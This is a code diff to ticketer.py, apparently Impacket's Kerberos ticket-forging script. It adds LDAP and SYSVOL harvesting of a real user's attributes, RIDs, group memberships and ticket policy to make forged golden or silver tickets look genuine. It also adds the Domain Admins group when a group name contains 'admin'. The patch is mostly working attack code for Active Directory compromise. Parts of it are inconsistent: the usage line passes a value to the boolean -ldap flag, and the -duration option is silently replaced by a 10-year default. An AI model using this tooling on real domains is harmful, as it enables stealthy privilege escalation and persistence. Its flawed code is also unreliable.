@@ -24,12 +24,11 @@
 #       baduser.ccache.
 #
 #       ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN>
-#                     -request -user <a valid domain user> -password <valid domain user's password> baduser
+#                     -request -user <a valid domain user> -password 'Password123' -ldap 'carline.lamar' baduser
 #
 #       will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
-#       as template for customization. Whatever encryption algorithms used on that ticket will be honored,
-#       hence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser' and saved
-#       as baduser.ccache.
+#       as template for customization. It will then query LDAP for 'carline.lamar' information to populate
+#       the PAC. Ticket will be generated for 'baduser' and saved as baduser.ccache.
 #
 # Author:
 #   Alberto Solino (@agsolino)
@@ -88,6 +87,12 @@ from impacket.krb5.crypto import _HMACMD5, _AES256CTS, string_to_key
 from impacket.krb5.kerberosv5 import sendReceive
 from impacket.krb5.types import Ticket
 from impacket.winregistry import hexdump
+from impacket.examples.utils import ldap_login
+from impacket.smbconnection import SMBConnection
+from impacket.ldap import ldapasn1
+from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
+import xml.etree.ElementTree as ET
+import re
 
 class TICKETER:
     def __init__(self, target, password, domain, options):
@@ -97,6 +102,15 @@ class TICKETER:
         self.__options = options
         self.__tgt = None
         self.__tgt_session_key = None
+        
+        # LDAP connection info
+        self.__ldap_connection = None
+        self.__smb_connection = None
+        self.__user_info = {}
+        self.__group_info = []
+        self.__kerberos_policies = {}
+        self.__domain_policy = {}
+        
         if options.spn:
             spn = options.spn.split('/')
             self.__service = spn[0]
@@ -123,6 +137,390 @@ class TICKETER:
     def getBlockLength(data_length):
         return (data_length + 7) // 8 * 8
 
+    def connectToLDAP(self):
+        """Connect to LDAP to retrieve user and group information"""
+        if not self.__options.request or not self.__options.ldap:
+            return
+            
+        try:
+            logging.info('Connecting to LDAP to gather user and group information...')
+            
+            # Create baseDN
+            domainParts = self.__domain.split('.')
+            baseDN = ''
+            for i in domainParts:
+                baseDN += 'dc=%s,' % i
+            baseDN = baseDN[:-1]
+            
+            # Connect to LDAP
+            self.__ldap_connection = ldap_login(
+                target=self.__options.dc_ip or self.__domain,
+                base_dn=baseDN,
+                kdc_ip=self.__options.dc_ip,
+                kdc_host=None,
+                do_kerberos=False,
+                username=self.__options.user,
+                password=self.__password,
+                domain=self.__domain,
+                lmhash='',
+                nthash='',
+                aeskey=''
+            )
+            
+            # Retrieve user information
+            self.getUserInfo()
+            
+            # Retrieve group membership
+            self.getGroupMembership()
+            
+            logging.info('Successfully gathered user information from LDAP')
+            
+        except Exception as e:
+            logging.error('Failed to connect to LDAP: %s' % str(e))
+            logging.warning('Continuing with provided parameters...')
+    
+    def getUserInfo(self):
+        """Retrieve user attributes from LDAP"""
+        try:
+            searchFilter = '(sAMAccountName=%s)' % self.__target
+            # Extended attributes for full PAC
+            attributes = [
+                'sAMAccountName', 'objectSid', 'memberOf', 'userAccountControl',
+                'pwdLastSet', 'lastLogon', 'lastLogonTimestamp', 'displayName', 'mail',
+                'scriptPath', 'profilePath', 'homeDirectory', 'homeDrive',
+                'logonCount', 'badPwdCount', 'primaryGroupID', 'userPrincipalName',
+                'accountExpires', 'badPasswordTime', 'lockoutTime', 'whenCreated',
+                'whenChanged', 'description', 'telephoneNumber', 'physicalDeliveryOfficeName'
+            ]
+            
+            self.__ldap_connection.search(
+                searchFilter=searchFilter,
+                attributes=attributes,
+                sizeLimit=1,
+                perRecordCallback=self.processUserRecord
+            )
+            
+        except Exception as e:
+            logging.error('Failed to retrieve user information: %s' % str(e))
+    
+    def processUserRecord(self, item):
+        """Process user record from LDAP"""
+        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
+            return
+            
+        try:
+            for attribute in item['attributes']:
+                attr_name = str(attribute['type'])
+                
+                if attr_name == 'sAMAccountName':
+                    self.__user_info['sAMAccountName'] = attribute['vals'][0].asOctets().decode('utf-8')
+                
+                elif attr_name == 'objectSid':
+                    sid_bytes = attribute['vals'][0].asOctets()
+                    # Parse SID to get RID
+                    if len(sid_bytes) >= 4:
+                        rid = int.from_bytes(sid_bytes[-4:], 'little')
+                        self.__user_info['rid'] = rid
+                        # Save full SID
+                        from impacket.dcerpc.v5.dtypes import SID
+                        sid = SID()
+                        sid.fromString(sid_bytes)
+                        self.__user_info['objectSid'] = sid.formatCanonical()
+                        logging.info('Found user RID: %d, SID: %s' % (rid, self.__user_info['objectSid']))
+                
+                elif attr_name == 'memberOf':
+                    groups = []
+                    for val in attribute['vals']:
+                        dn = val.asOctets().decode('utf-8')
+                        # Extract CN from DN
+                        cn_match = re.search(r'CN=([^,]+)', dn)
+                        if cn_match:
+                            groups.append(cn_match.group(1))
+                    self.__user_info['memberOf'] = groups
+                    logging.info('Found user groups: %s' % ', '.join(groups))
+                
+                elif attr_name == 'userAccountControl':
+                    uac = int(str(attribute['vals'][0]))
+                    self.__user_info['userAccountControl'] = uac
+                    logging.info('User Account Control: %d' % uac)
+                
+                elif attr_name == 'displayName':
+                    self.__user_info['displayName'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('Display Name: %s' % self.__user_info['displayName'])
+                
+                elif attr_name == 'mail':
+                    self.__user_info['mail'] = attribute['vals'][0].asOctets().decode('utf-8')
+                
+                elif attr_name == 'userPrincipalName':
+                    self.__user_info['userPrincipalName'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('UPN: %s' % self.__user_info['userPrincipalName'])
+                
+                elif attr_name == 'scriptPath':
+                    self.__user_info['scriptPath'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('Logon Script: %s' % self.__user_info['scriptPath'])
+                
+                elif attr_name == 'profilePath':
+                    self.__user_info['profilePath'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('Profile Path: %s' % self.__user_info['profilePath'])
+                
+                elif attr_name == 'homeDirectory':
+                    self.__user_info['homeDirectory'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('Home Directory: %s' % self.__user_info['homeDirectory'])
+                
+                elif attr_name == 'homeDrive':
+                    self.__user_info['homeDrive'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('Home Drive: %s' % self.__user_info['homeDrive'])
+                
+                elif attr_name == 'logonCount':
+                    self.__user_info['logonCount'] = int(str(attribute['vals'][0]))
+                    logging.info('Logon Count: %d' % self.__user_info['logonCount'])
+                
+                elif attr_name == 'badPwdCount':
+                    self.__user_info['badPwdCount'] = int(str(attribute['vals'][0]))
+                    logging.info('Bad Password Count: %d' % self.__user_info['badPwdCount'])
+                
+                elif attr_name == 'primaryGroupID':
+                    self.__user_info['primaryGroupID'] = int(str(attribute['vals'][0]))
+                    logging.info('Primary Group ID: %d' % self.__user_info['primaryGroupID'])
+                
+                elif attr_name == 'pwdLastSet':
+                    if str(attribute['vals'][0]) != '0':
+                        # Convert Windows FILETIME to Unix timestamp
+                        filetime = int(str(attribute['vals'][0]))
+                        self.__user_info['pwdLastSet'] = filetime
+                        import datetime
+                        unix_time = (filetime - 116444736000000000) / 10000000
+                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
+                        logging.info('Password Last Set: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
+                
+                elif attr_name == 'lastLogon':
+                    if str(attribute['vals'][0]) != '0':
+                        filetime = int(str(attribute['vals'][0]))
+                        self.__user_info['lastLogon'] = filetime
+                        unix_time = (filetime - 116444736000000000) / 10000000
+                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
+                        logging.info('Last Logon: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
+                
+                elif attr_name == 'lastLogonTimestamp':
+                    if str(attribute['vals'][0]) != '0':
+                        filetime = int(str(attribute['vals'][0]))
+                        self.__user_info['lastLogonTimestamp'] = filetime
+                
+                elif attr_name == 'accountExpires':
+                    if str(attribute['vals'][0]) != '0' and str(attribute['vals'][0]) != '9223372036854775807':
+                        filetime = int(str(attribute['vals'][0]))
+                        self.__user_info['accountExpires'] = filetime
+                        unix_time = (filetime - 116444736000000000) / 10000000
+                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
+                        logging.info('Account Expires: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
+                    else:
+                        self.__user_info['accountExpires'] = 0  # Never expires
+                
+                # Additional fields for completeness
+                elif attr_name in ['description', 'telephoneNumber', 'physicalDeliveryOfficeName']:
+                    if attribute['vals']:
+                        self.__user_info[attr_name] = attribute['vals'][0].asOctets().decode('utf-8')
+                    
+        except Exception as e:
+            logging.error('Error processing user record: %s' % str(e))
+    
+    def getGroupMembership(self):
+        """Retrieve group membership information"""
+        try:
+            # Retrieve domain groups
+            searchFilter = '(objectClass=group)'
+            attributes = ['sAMAccountName', 'objectSid', 'groupType']
+            
+            self.__ldap_connection.search(
+                searchFilter=searchFilter,
+                attributes=attributes,
+                sizeLimit=0,
+                perRecordCallback=self.processGroupRecord
+            )
+            
+        except Exception as e:
+            logging.error('Failed to retrieve group information: %s' % str(e))
+    
+    def processGroupRecord(self, item):
+        """Process group record from LDAP"""
+        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
+            return
+            
+        try:
+            group_info = {}
+            for attribute in item['attributes']:
+                attr_name = str(attribute['type'])
+                if attr_name == 'sAMAccountName':
+                    group_info['name'] = attribute['vals'][0].asOctets().decode('utf-8')
+                elif attr_name == 'objectSid':
+                    sid_bytes = attribute['vals'][0].asOctets()
+                    if len(sid_bytes) >= 4:
+                        rid = int.from_bytes(sid_bytes[-4:], 'little')
+                        group_info['rid'] = rid
+                elif attr_name == 'groupType':
+                    group_info['groupType'] = int(str(attribute['vals'][0]))
+            
+            if 'name' in group_info and 'rid' in group_info:
+                self.__group_info.append(group_info)
+                
+        except Exception as e:
+            logging.error('Error processing group record: %s' % str(e))
+    
+    def connectToSYSVOL(self):
+        """Connect to SYSVOL to retrieve domain policies"""
+        if not self.__options.request or not self.__options.ldap:
+            return
+            
+        try:
+            logging.info('Connecting to SYSVOL to gather domain policies...')
+            
+            # Connect to SMB
+            self.__smb_connection = SMBConnection(
+                self.__options.dc_ip or self.__domain,
+                self.__options.dc_ip or self.__domain
+            )
+            
+            self.__smb_connection.login(
+                self.__options.user,
+                self.__password,
+                self.__domain
+            )
+            
+            # Retrieve Kerberos policies
+            self.extractKerberosPolicies()
+            
+            logging.info('Successfully gathered domain policies from SYSVOL')
+            
+        except Exception as e:
+            logging.error('Failed to connect to SYSVOL: %s' % str(e))
+            logging.warning('Continuing with default policies...')
+    
+    def extractKerberosPolicies(self):
+        """Extract Kerberos policies from SYSVOL"""
+        try:
+            # Search for policy files in SYSVOL
+            share_name = 'SYSVOL'
+            domain_path = '%s/Policies' % self.__domain
+            
+            # Search for GptTmpl.inf files containing Kerberos policies
+            self.searchPolicyFiles(share_name, domain_path)
+            
+        except Exception as e:
+            logging.error('Failed to extract Kerberos policies: %s' % str(e))
+    
+    def searchPolicyFiles(self, share_name, base_path):
+        """Search for policy files in SYSVOL"""
+        try:
+            files = self.__smb_connection.listPath(share_name, base_path + '/*')
+            
+            for file_info in files:
+                if file_info.get_longname() not in ['.', '..']:
+                    if file_info.is_directory():
+                        # Recursive search in subdirectories
+                        sub_path = base_path + '/' + file_info.get_longname()
+                        self.searchPolicyFiles(share_name, sub_path)
+                    elif file_info.get_longname().lower() == 'gpttmpl.inf':
+                        # Found policy file
+                        file_path = base_path + '/' + file_info.get_longname()
+                        self.parsePolicyFile(share_name, file_path)
+                        
+        except Exception as e:
+            logging.debug('Error searching policy files in %s: %s' % (base_path, str(e)))
+    
+    def parsePolicyFile(self, share_name, file_path):
+        """Parse policy file"""
+        try:
+            import io
+            fh = io.BytesIO()
+            self.__smb_connection.getFile(share_name, file_path, fh.write)
+            content = fh.getvalue().decode('utf-16le', errors='ignore')
+            
+            # Find Kerberos policies
+            kerberos_section = False
+            for line in content.split('\n'):
+                line = line.strip()
+                if line == '[Kerberos Policy]':
+                    kerberos_section = True
+                    continue
+                elif line.startswith('[') and kerberos_section:
+                    kerberos_section = False
+                    continue
+                
+                if kerberos_section and '=' in line:
+                    key, value = line.split('=', 1)
+                    key = key.strip()
+                    value = value.strip()
+                    self.__kerberos_policies[key] = value
+            
+            if self.__kerberos_policies:
+                logging.info('Found Kerberos policies: %s' % str(self.__kerberos_policies))
+                
+                # Apply policy settings
+                if 'MaxTicketAge' in self.__kerberos_policies:
+                    try:
+                        self.__domain_policy['MaxTicketAge'] = int(self.__kerberos_policies['MaxTicketAge'])
+                    except ValueError:
+                        logging.warning('Invalid MaxTicketAge value: %s' % self.__kerberos_policies['MaxTicketAge'])
+                
+                if 'MaxRenewAge' in self.__kerberos_policies:
+                    try:
+                        self.__domain_policy['MaxRenewAge'] = int(self.__kerberos_policies['MaxRenewAge'])
+                    except ValueError:
+                        logging.warning('Invalid MaxRenewAge value: %s' % self.__kerberos_policies['MaxRenewAge'])
+                
+        except Exception as e:
+            logging.debug('Error parsing policy file %s: %s' % (file_path, str(e)))
+    
+    def updateTicketWithLDAPInfo(self):
+        """Update ticket parameters based on LDAP information"""
+        if not self.__user_info:
+            return
+            
+        try:
+            # Update user-id if found in LDAP
+            if 'rid' in self.__user_info:
+                self.__options.user_id = str(self.__user_info['rid'])
+                logging.info('Updated user-id from LDAP: %s' % self.__options.user_id)
+            
+            # Update groups if found in LDAP
+            if self.__group_info:
+                # Find corresponding RIDs for user groups
+                user_groups = self.__user_info.get('memberOf', [])
+                group_rids = []
+                
+                for group in self.__group_info:
+                    if group['name'] in user_groups:
+                        group_rids.append(str(group['rid']))
+                
+                # Add standard groups
+                if '513' not in group_rids:  # Domain Users
+                    group_rids.append('513')
+                if '512' not in group_rids and any('admin' in g.lower() for g in user_groups):  # Domain Admins
+                    group_rids.append('512')
+                
+                if group_rids:
+                    self.__options.groups = ','.join(group_rids)
+                    logging.info('Updated groups from LDAP: %s' % self.__options.groups)
+            
+        except Exception as e:
+            logging.error('Failed to update ticket with LDAP info: %s' % str(e))
+
+    def getTicketDuration(self):
+        """Calculate ticket duration based on domain policy"""
+        # Default to 10 years if no policy found
+        max_ticket_age = 87600  # 10 years in hours
+        
+        if self.__domain_policy:
+            if 'MaxTicketAge' in self.__domain_policy:
+                max_ticket_age = self.__domain_policy['MaxTicketAge']
+                logging.info('Using MaxTicketAge from domain policy: %d hours' % max_ticket_age)
+            else:
+                logging.info('Using default MaxTicketAge: 10 years')
+        else:
+            logging.info('No domain policy found, using default MaxTicketAge: 10 years')
+        
+        return max_ticket_age
+
     def loadKeysFromKeytab(self, filename):
         keytab = Keytab.loadFile(filename)
         keyblock = keytab.getKey("%s@%s" % (options.spn, self.__domain))
@@ -138,53 +536,104 @@ class TICKETER:
         # 1) KERB_VALIDATION_INFO
         kerbdata = KERB_VALIDATION_INFO()
 
-        aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
-        unixTime = self.getFileTime(aTime)
+        # If LDAP is used and user data is available, use real values
+        if self.__options.ldap and self.__user_info:
+            logging.info('Creating PAC with real LDAP data...')
+            
+            # LogonTime - use current time or lastLogon from LDAP
+            if 'lastLogon' in self.__user_info and self.__user_info['lastLogon']:
+                logonTime = self.__user_info['lastLogon']
+            else:
+                aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
+                logonTime = self.getFileTime(aTime)
+            
+            kerbdata['LogonTime']['dwLowDateTime'] = logonTime & 0xffffffff
+            kerbdata['LogonTime']['dwHighDateTime'] = logonTime >> 32
+            
+            # PasswordLastSet - from LDAP or current time
+            if 'pwdLastSet' in self.__user_info and self.__user_info['pwdLastSet']:
+                pwdLastSet = self.__user_info['pwdLastSet']
+            else:
+                aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
+                pwdLastSet = self.getFileTime(aTime)
+                
+            kerbdata['PasswordLastSet']['dwLowDateTime'] = pwdLastSet & 0xffffffff
+            kerbdata['PasswordLastSet']['dwHighDateTime'] = pwdLastSet >> 32
+            
+            # PasswordCanChange - typically pwdLastSet + 1 day
+            pwdCanChange = pwdLastSet + (24 * 60 * 60 * 10000000)  # +1 day in FILETIME
+            kerbdata['PasswordCanChange']['dwLowDateTime'] = pwdCanChange & 0xffffffff
+            kerbdata['PasswordCanChange']['dwHighDateTime'] = pwdCanChange >> 32
+            
+            # PasswordMustChange - if password policy exists, else never
+            if 'accountExpires' in self.__user_info and self.__user_info['accountExpires']:
+                pwdMustChange = self.__user_info['accountExpires']
+                kerbdata['PasswordMustChange']['dwLowDateTime'] = pwdMustChange & 0xffffffff
+                kerbdata['PasswordMustChange']['dwHighDateTime'] = pwdMustChange >> 32
+            else:
+                # If no policy, password never expires
+                kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
+                kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF
+            
+            # Names and paths from LDAP
+            kerbdata['EffectiveName'] = self.__user_info.get('sAMAccountName', self.__target)
+            kerbdata['FullName'] = self.__user_info.get('displayName', '')
+            kerbdata['LogonScript'] = self.__user_info.get('scriptPath', '')
+            kerbdata['ProfilePath'] = self.__user_info.get('profilePath', '')
+            kerbdata['HomeDirectory'] = self.__user_info.get('homeDirectory', '')
+            kerbdata['HomeDirectoryDrive'] = self.__user_info.get('homeDrive', '')
+            
+            # Counters from LDAP
+            kerbdata['LogonCount'] = self.__user_info.get('logonCount', 0)
+            kerbdata['BadPasswordCount'] = self.__user_info.get('badPwdCount', 0)
+            
+            # User ID from LDAP
+            kerbdata['UserId'] = self.__user_info.get('rid', int(self.__options.user_id))
+            
+            logging.info('PAC populated with LDAP data:')
+            logging.info('  EffectiveName: %s' % kerbdata['EffectiveName'])
+            logging.info('  FullName: %s' % kerbdata['FullName'])
+            logging.info('  LogonScript: %s' % kerbdata['LogonScript'])
+            logging.info('  ProfilePath: %s' % kerbdata['ProfilePath'])
+            logging.info('  HomeDirectory: %s' % kerbdata['HomeDirectory'])
+            logging.info('  HomeDirectoryDrive: %s' % kerbdata['HomeDirectoryDrive'])
+            logging.info('  LogonCount: %d' % kerbdata['LogonCount'])
+            logging.info('  BadPasswordCount: %d' % kerbdata['BadPasswordCount'])
+            logging.info('  UserId: %d' % kerbdata['UserId'])
+            
+        else:
+            # Use default values as before
+            aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
+            unixTime = self.getFileTime(aTime)
 
-        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
-        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32
+            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
+            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32
+            
+            kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
+            kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32
 
-        # LogoffTime: A FILETIME structure that contains the time the client's logon
-        # session should expire. If the session should not expire, this structure
-        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
-        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as
-        # an indicator of when to warn the user that the allowed time is due to expire.
+            kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
+            kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
+            
+            kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
+            kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF
+
+            kerbdata['EffectiveName'] = self.__target
+            kerbdata['FullName'] = ''
+            kerbdata['LogonScript'] = ''
+            kerbdata['ProfilePath'] = ''
+            kerbdata['HomeDirectory'] = ''
+            kerbdata['HomeDirectoryDrive'] = ''
+            kerbdata['LogonCount'] = 500
+            kerbdata['BadPasswordCount'] = 0
+            kerbdata['UserId'] = int(self.__options.user_id)
+
+        # Common fields for both cases
+        # LogoffTime and KickOffTime always set to "never"
         kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
         kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF
-
-        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user
-        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the
-        # client should not be logged off, this structure SHOULD have the dwHighDateTime
-        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF.
-        # The Kerberos service ticket end time is a replacement for KickOffTime.
-        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of
-        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator
-        # of when the client should be forcibly disconnected.
         kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
         kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF
-
-        kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
-        kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32
-
-        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
-        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
-
-        # PasswordMustChange: A FILETIME structure that contains the time at which
-        # theclient's password expires. If the password will not expire, this
-        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
-        # dwLowDateTime member set to 0xFFFFFFFF.
-        kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
-        kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF
-
-        kerbdata['EffectiveName'] = self.__target
-        kerbdata['FullName'] = ''
-        kerbdata['LogonScript'] = ''
-        kerbdata['ProfilePath'] = ''
-        kerbdata['HomeDirectory'] = ''
-        kerbdata['HomeDirectoryDrive'] = ''
-        kerbdata['LogonCount'] = 500
-        kerbdata['BadPasswordCount'] = 0
-        kerbdata['UserId'] = int(self.__options.user_id)
 
         # Our Golden Well-known groups! :)
         groups = self.__options.groups.split(',')
@@ -271,7 +720,17 @@ class TICKETER:
         upnDnsInfo = UPN_DNS_INFO_FULL()
 
         PAC_pad = b'\x00' * self.getPadLength(len(upnDnsInfo))
-        upn_data = f"{self.__target.lower()}@{self.__domain.lower()}".encode("utf-16-le")
+        
+        # Use UPN from LDAP if available, else construct
+        if self.__options.ldap and self.__user_info and 'userPrincipalName' in self.__user_info:
+            upn_string = self.__user_info['userPrincipalName'].lower()
+            sam_name = self.__user_info.get('sAMAccountName', self.__target)
+            logging.info('Using LDAP UPN: %s' % upn_string)
+        else:
+            upn_string = f"{self.__target.lower()}@{self.__domain.lower()}"
+            sam_name = self.__target
+            
+        upn_data = upn_string.encode("utf-16-le")
         upnDnsInfo['UpnLength'] = len(upn_data)
         upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)
         total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']
@@ -288,15 +747,17 @@ class TICKETER:
         # Enable additional data mode (Sam + SID)
         upnDnsInfo['Flags'] = 2
 
-        samName = self.__target.encode("utf-16-le")
+        samName = sam_name.encode("utf-16-le")
         upnDnsInfo['SamNameLength'] = len(samName)
         upnDnsInfo['SamNameOffset'] = total_len + pad
         total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']
         pad = self.getPadLength(total_len)
         samName += b'\x00' * pad
 
+        # Use real User ID from LDAP
+        user_id = self.__user_info.get('rid', int(self.__options.user_id)) if (self.__options.ldap and self.__user_info) else int(self.__options.user_id)
         user_sid = SID()
-        user_sid.fromCanonical(f"{self.__options.domain_sid}-{self.__options.user_id}")
+        user_sid.fromCanonical(f"{self.__options.domain_sid}-{user_id}")
         upnDnsInfo['SidLength'] = len(user_sid)
         upnDnsInfo['SidOffset'] = total_len + pad
         total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']
@@ -319,12 +780,26 @@ class TICKETER:
     def createRequestorInfoPac(self, pacInfos):
         pacRequestor = PAC_REQUESTOR()
         pacRequestor['UserSid'] = SID()
-        pacRequestor['UserSid'].fromCanonical(f"{self.__options.domain_sid}-{self.__options.user_id}")
+        
+        # Use real User ID from LDAP
+        user_id = self.__user_info.get('rid', int(self.__options.user_id)) if (self.__options.ldap and self.__user_info) else int(self.__options.user_id)
+        pacRequestor['UserSid'].fromCanonical(f"{self.__options.domain_sid}-{user_id}")
 
         pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()
 
     def createBasicTicket(self):
         if self.__options.request is True:
+            # Connect to LDAP and SYSVOL to retrieve information (only with -ldap flag)
+            if self.__options.ldap:
+                logging.info('LDAP flag enabled - gathering information from Active Directory...')
+                self.connectToLDAP()
+                self.connectToSYSVOL()
+                
+                # Update ticket parameters with retrieved information
+                self.updateTicketWithLDAPInfo()
+            else:
+                logging.info('Using provided parameters (use -ldap flag to gather info from AD)')
+            
             if self.__domain == self.__server:
                 logging.info('Requesting TGT to target domain to use as basis')
             else:
@@ -597,7 +1072,9 @@ class TICKETER:
     def customizeTicket(self, kdcRep, pacInfos):
         logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))
 
-        ticketDuration = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=int(self.__options.duration))
+        # Get ticket duration from domain policy
+        max_ticket_hours = self.getTicketDuration()
+        ticketDuration = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=max_ticket_hours)
 
         if self.__options.impersonate:
             # Doing Sapphire Ticket
@@ -1094,12 +1571,25 @@ class TICKETER:
             ccache.fromTGS(ticket, sessionKey, sessionKey)
         ccache.saveFile(self.__target.replace('/','.') + '.ccache')
 
+    def cleanup(self):
+        """Close connections"""
+        try:
+            if self.__ldap_connection:
+                self.__ldap_connection.close()
+            if self.__smb_connection:
+                self.__smb_connection.close()
+        except:
+            pass
+
     def run(self):
-        ticket, adIfRelevant = self.createBasicTicket()
-        if ticket is not None:
-            encASorTGSRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
-            ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
-            self.saveTicket(ticket, sessionKey)
+        try:
+            ticket, adIfRelevant = self.createBasicTicket()
+            if ticket is not None:
+                encASorTGSRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
+                ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
+                self.saveTicket(ticket, sessionKey)
+        finally:
+            self.cleanup()
 
 if __name__ == '__main__':
     print(version.BANNER)
@@ -1118,8 +1608,8 @@ if __name__ == '__main__':
                                                                              '(128 or 256 bits)')
     parser.add_argument('-nthash', action="store", help='NT hash used for signing the ticket')
     parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file (silver ticket only)')
-    parser.add_argument('-groups', action="store", default = '513, 512, 520, 518, 519', help='comma separated list of '
-                        'groups user will belong to (default = 513, 512, 520, 518, 519)')
+    parser.add_argument('-groups', action="store", default = '513,512,520,518,519', help='comma separated list of '
+                        'groups user will belong to (default = 513,512,520,518,519)')
     parser.add_argument('-user-id', action="store", default = '500', help='user id for the user the ticket will be '
                                                                           'created for (default = 500)')
     parser.add_argument('-extra-sid', action="store", help='Comma separated list of ExtraSids to be included inside the ticket\'s PAC')
@@ -1142,6 +1632,8 @@ if __name__ == '__main__':
     parser.add_argument('-impersonate', action="store", help='Sapphire ticket. target username that will be impersonated (through S4U2Self+U2U)'
                                                              ' for querying the ST and extracting the PAC, which will be'
                                                              ' included in the new ticket')
+    parser.add_argument('-ldap', action='store_true', default=False, help='When used with -request, automatically '
+                        'gather user and group information from LDAP and domain policies from SYSVOL')
 
     if len(sys.argv)==1:
         parser.print_help()
@@ -1152,11 +1644,10 @@ if __name__ == '__main__':
         print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
         print("\tbaduser.ccache.\n")
         print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " 
-              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n")
+              "<your domain FQDN> -request -user <a valid domain user> -password 'Password123' -ldap 'carline.lamar' baduser\n")
         print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
-        print("\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,")
-        print("\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'")
-        print("\tand saved as baduser.ccache")
+        print("\tas template for customization. It will then query LDAP for 'carline.lamar' information to populate")
+        print("\tthe PAC. Ticket will be generated for 'baduser' and saved as baduser.ccache")
         sys.exit(1)
 
     options = parser.parse_args()
